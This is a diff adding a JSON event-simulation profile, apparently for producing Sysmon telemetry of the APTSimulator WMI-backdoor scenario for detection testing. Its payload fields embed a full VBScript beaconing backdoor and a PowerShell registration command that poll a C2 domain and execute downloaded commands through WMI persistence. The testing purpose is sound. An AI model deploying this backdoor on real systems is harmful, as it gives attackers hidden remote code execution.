@@ -1,0 +1,63 @@
+{
+	"name": "APTsimulator wmi-backdoor-c2",
+	"version": "0.1",
+	"author": "n0dec",
+	"description": "APTsimulator wmi-backdoor-c2 events.",
+	"rules": {
+		"drop_file": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "File created",
+			"description": "Writing powershell script.",
+			"payload": {
+				"Image": "C:\\Users\\Administrator\\Downloads\\APTSimulator_pw_apt\\APTSimulator\\helpers\\7z.exe",
+				"TargetFilename": "C:\\TMP\\WMIBackdoor.ps1"
+			}
+		},
+		"powershell_file": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "Process Create",
+			"description": "Executing powershell script.",
+			"payload": {
+				"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+				"CommandLine": "powershell.exe -Exec ByPasS \". \\\"%APTDIR%\\WMIBackdoor.ps1\\\";$Trigger2=New-WMIBackdoorTrigger -TimingInterval 60;$Action2=New-WMIBackdoorAction -C2Uri 'http://googleaccountsservices.com' -Backdoor; $Registration2=Register-WMIBackdoor -Trigger $Trigger2 -Action $Action2\""
+			}
+		},
+		"wmi_filter": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "WmiEventFilter activity detected",
+			"description": "Creating WMI filter.",
+			"payload": {
+				"Operation": "Created",
+				"EventNamespace":  "\"ROOT\\\\cimv2\"",
+				"Name":  "\"TimingIntervalTrigger\"",
+				"Query":  "\"SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'\""
+			}
+		},
+		"wmi_consumer": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "WmiEventConsumer activity detected",
+			"description": "Creating WMI consumer.",
+			"payload": {
+				"Operation": "Created",
+				"Name":  "\"LaunchBeaconingBackdoor\"",
+				"Type": "Script",
+				"Destination":  "\"                Option Explicit\n                On Error Resume Next\n\n                Dim oXMLHTTP, oReg, aC2URL, aCmdType, aClassName, aPropertyName, aPayload, aMachineGuid\n\n                Set oReg = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\default:StdRegProv\")\n                oReg.GetStringValue &H80000002, \"SOFTWARE\\Microsoft\\Cryptography\", \"MachineGuid\", aMachineGuid\n\n                aC2URL = \"http://googleaccountsservices.com/index.html&ID=\" & aMachineGuid\n\n                Sub StorePayloadInWMIRepo(classname, propertyname, payload)\n\t                Dim oLocation, oServices, oDataObject\n\t\n\t                Set oLocation = CreateObject(\"WbemScripting.SWbemLocator\")\n\t                Set oServices = oLocation.ConnectServer(, \"root\\cimv2\")\n\t\n\t                Set oDataObject = oServices.Get\n\t                oDataObject.Path_.Class = classname\n\t                oDataObject.Properties_.Add(propertyname, 8).Value = payload\n\t                oDataObject.Put_\n                End Sub\n\n                Sub DeleteWMIClass(classname, propertyname)\n                    Dim oLocation, oServices, oDataObject\n\n                    Set oLocation = CreateObject(\"WbemScripting.SWbemLocator\")\n                    Set oServices = oLocation.ConnectServer(, \"root\\cimv2\")\n\t\n                    Set oDataObject = oServices.Get\n                    oDataObject.Path_.Class = classname\n                    oDataObject.Properties_.Add(propertyname, 8).Value = \"\"\n                    oDataObject.Delete_()\n                End Sub\n\n                Sub ExecCommand(command)\n\t                Dim oLocation, oServices, oProcess, oStartup, oConfig, oResult, iProcessID\n\n\t                Const HIDDEN_WINDOW = 12\n\t                Set oLocation = CreateObject(\"WbemScripting.SWbemLocator\")\n\t                Set oServices = oLocation.ConnectServer(, \"root\\cimv2\")\n\t                Set oStartup = oServices.Get(\"Win32_ProcessStartup\")\n\t                Set oConfig = oStartup.SpawnInstance_\n\t                oConfig.ShowWindow = HIDDEN_WINDOW\n\t                Set oProcess = GetObject(\"winmgmts:root\\cimv2:Win32_Process\")\n\t                oResult = oProcess.Create(command, null, oConfig, iProcessID)\n                End Sub\n\n                        ' Decodes a base-64 encoded string (BSTR type).\n        ' 1999 - 2004 Antonin Foller, http://www.motobit.com\n        ' 1.01 - solves problem with Access And 'Compare Database' (InStr)\n        Function Base64Decode(ByVal base64String)\n            'rfc1521\n            '1999 Antonin Foller, Motobit Software, http://Motobit.cz\n            Const Base64 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n            Dim dataLength, sOut, groupBegin\n  \n            'remove white spaces, If any\n            base64String = Replace(base64String, vbCrLf, \"\")\n            base64String = Replace(base64String, vbTab, \"\")\n            base64String = Replace(base64String, \" \", \"\")\n  \n            'The source must consists from groups with Len of 4 chars\n            dataLength = Len(base64String)\n            If dataLength Mod 4 <> 0 Then\n            Err.Raise 1, \"Base64Decode\", \"Bad Base64 string.\"\n            Exit Function\n            End If\n\n  \n            ' Now decode each group:\n            For groupBegin = 1 To dataLength Step 4\n            Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut\n            ' Each data group encodes up To 3 actual bytes.\n            numDataBytes = 3\n            nGroup = 0\n\n            For CharCounter = 0 To 3\n                ' Convert each character into 6 bits of data, And add it To\n                ' an integer For temporary storage.  If a character is a '=', there\n                ' is one fewer data byte.  (There can only be a maximum of 2 '=' In\n                ' the whole string.)\n\n                thisChar = Mid(base64String, groupBegin + CharCounter, 1)\n\n                If thisChar = \"=\" Then\n                numDataBytes = numDataBytes - 1\n                thisData = 0\n                Else\n                thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1\n                End If\n                If thisData = -1 Then\n                Err.Raise 2, \"Base64Decode\", \"Bad character In Base64 string.\"\n                Exit Function\n                End If\n\n                nGroup = 64 * nGroup + thisData\n            Next\n    \n            'Hex splits the long To 6 groups with 4 bits\n            nGroup = Hex(nGroup)\n    \n            'Add leading zeros\n            nGroup = String(6 - Len(nGroup), \"0\") & nGroup\n    \n            'Convert the 3 byte hex integer (6 chars) To 3 characters\n            pOut = Chr(CByte(\"&H\" & Mid(nGroup, 1, 2))) + _\n                Chr(CByte(\"&H\" & Mid(nGroup, 3, 2))) + _\n                Chr(CByte(\"&H\" & Mid(nGroup, 5, 2)))\n    \n            'add numDataBytes characters To out string\n            sOut = sOut & Left(pOut, numDataBytes)\n            Next\n\n            Base64Decode = sOut\n        End Function\n\n                Set oXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")\n                oXMLHTTP.open \"GET\", aC2URL, False\n                oXMLHTTP.send()\n\n                If oXMLHTTP.Status = 200 Then\n\t                aCmdType = oXMLHTTP.getResponseHeader(\"Type\")\n\t                aClassName = oXMLHTTP.getResponseHeader(\"Class\")\n\t                aPropertyName = oXMLHTTP.getResponseHeader(\"Property\")\n\t                aPayload = Base64Decode(oXMLHTTP.responseText)\n\t\n\t                Select Case aCmdType\n\t\t                Case \"V\"\n\t\t\t                If Not IsNull(aPayload) Then\n\t\t\t\t                Execute aPayload\n\t\t\t                End If\n\t\t                Case \"P\"\n\t\t\t                If Not IsNull(aClassName) And Not IsNull(aPropertyName) And Not IsNull(aPayload) Then\n\t\t\t\t                Call StorePayloadInWMIRepo(aClassName, aPropertyName, aPayload)\n\t\t\t                End If\n                        Case \"D\"\n                            If Not IsNull(aClassName) And Not IsNull(aPropertyName) Then\n\t\t\t\t                Call DeleteWMIClass(aClassName, aPropertyName)\n\t\t\t                End If\n\t\t                Case \"C\"\n\t\t\t                If Not IsNull(aPayload) Then\n\t\t\t\t                Call ExecCommand(aPayload)\n\t\t\t                End If\n\t                End Select\n                End If\n\""
+			}
+		},
+		"wmi_binding": {
+			"enabled": true,
+			"source": "Sysmon",
+			"category": "WmiEventConsumerToFilter activity detected",
+			"description": "Creating WMI binding.",
+			"payload": {
+				"Operation": "Created",
+				"Consumer":  "\"ActiveScriptEventConsumer.Name=\\\"LaunchBeaconingBackdoor\\\"\"",
+				"Filter":  "\"__EventFilter.Name=\\\"TimingIntervalTrigger\\\"\""
+			}
+		}
+	}
+}
